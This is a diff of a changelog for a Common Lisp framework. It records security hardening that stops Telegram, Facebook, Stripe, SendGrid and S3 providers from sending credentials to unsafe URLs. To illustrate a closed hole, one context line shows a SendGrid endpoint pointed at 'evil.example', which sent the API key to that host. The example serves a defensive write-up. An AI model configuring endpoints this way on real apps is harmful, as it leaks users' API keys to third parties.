@@ -14,6 +14,38 @@ its tag.
 
 ### An app may have to act
 
+- **Telegram, Facebook and Stripe now check the URL they send a credential to, and refuse to
+  build when it is one they may not** (#1106). `make-telegram`'s `:api-base`, `make-facebook`'s
+  `:graph-base` and `make-stripe-payments`'s `:api-base` accepted any value; each now signals
+  `configuration-error` for a value that is not `http` or `https`, carries a user name or
+  password, has no host, carries a query or fragment, is a bracketed IPv6 address, contains a
+  control character, or is plaintext `http` to a host this machine or network cannot reach by
+  itself. **An app that pointed one of these at a plaintext remote host, or at a URL with
+  credentials in it, will fail when the provider is made** rather than on the first send. The
+  checks run on `shared-initialize`, so `reinitialize-instance` is checked too, and a refusal
+  leaves the provider's previous URL in place.
+  **Telegram's refusal says the token travels in the path**, not in a header, because that is
+  where it goes: every request is `<base>/bot<token>/<method>`, so a mistyped base does not only
+  expose the token to one host, it writes it into any access log along the way.
+  Facebook's `:dialog-base` is **not** checked: no credential is sent to it — it is where a
+  person's browser is sent — so the rule about carrying a credential in the clear has nothing to
+  say about it.
+
+- **`hermes/blob` refuses an IPv6 address as an S3 endpoint, in either spelling** (#1106). The
+  bare form (`::1`) was already refused, with advice to write it bracketed instead; the bracketed
+  form (`[::1]:9000`) was accepted, and three tests asserted it was usable. **None of them sent a
+  request.** Measured against a listener genuinely accepting on `[::1]`:
+
+  ```
+  dex:request "http://[::1]:37753/"  ->  USOCKET:NS-HOST-NOT-FOUND-ERROR
+  ```
+
+  `quri` hands usocket the host with its brackets still attached and no such name exists, so the
+  connection is never attempted. **An app using an IPv6 endpoint was already unable to send**, and
+  now finds out when the store is made instead; use a name that resolves to the address, or an
+  IPv4 address. This is the same rule hermes has applied to a credential URL since #1077, and
+  sharing the rule is what brought the two into agreement.
+
 - **hermes: `make-sendgrid` now checks its `:endpoint`, and refuses one a request should not carry
   the API key to** (#1092). It was not checked at all before, so
   `(make-sendgrid :endpoint "http://evil.example/v3/mail/send")` sent the key — a `Bearer`
@@ -81,8 +113,8 @@ its tag.
   plaintext request to a public host sent with no proxy and an `Authorization` header — the same
   door that removing the `s3-store` initarg closed, one layer down. The approval is now an
   unexported variable bound around the send by the three senders that hold a verdict, and the
-  exported surface cannot express one: `proxy-arguments` no longer takes the keyword, and
-  `make-request` ignores it.
+  exported surface cannot express one: neither `proxy-arguments` nor `make-request` accepts the
+  keyword, and passing it to either signals.
   **None of the three slots has an initarg, and each is recomputed on every initialization.** The
   value is a verdict the framework reached. `s3-store` is exported, so while it had an initarg
   `(make-instance 'hermes/blob:s3-store :endpoint "public.example:80" :secure nil :path-style t
@@ -1316,6 +1348,19 @@ its tag.
   `contrib-load-failure-p`, `contrib-failure-lines` and `explain-contrib-failure`.
 
 ### Added
+
+- **`aion/http-client:credential-url-refusal`**, the rule deciding whether a URL is one a
+  framework may send a credential to (#1106). It **returns a refusal sentence rather than
+  signalling**, so each caller signals its own condition: hermes signals `configuration-error`
+  and `hermes/blob` signals `blob-configuration-error`. That is what lets one rule serve both
+  without `hermes/blob` depending on hermes core — it does not, and must not start to — and the
+  move adds no `:depends-on` anywhere, since both already depend on `aion/http-client`. It takes
+  `:setting`, `:example`, `:credential`, `:carried-in` and `:appends-path`, and returns the
+  reason, the parsed URI, and the host it approved as local. It lives beside `local-host-p`,
+  which is the half of the rule that moved there in #1082.
+  **Why one place:** the rule was written twice, and the two copies grew three different holes
+  between them — a bracketed IPv6 address in the userinfo, a scheme inside the endpoint, and a
+  bucket label in front of the host — each a case the other copy's fix had already closed.
 
 
 - **`aion/http-client:local-host-p` and `aion/http-client:url-host` are exported** (#1082).
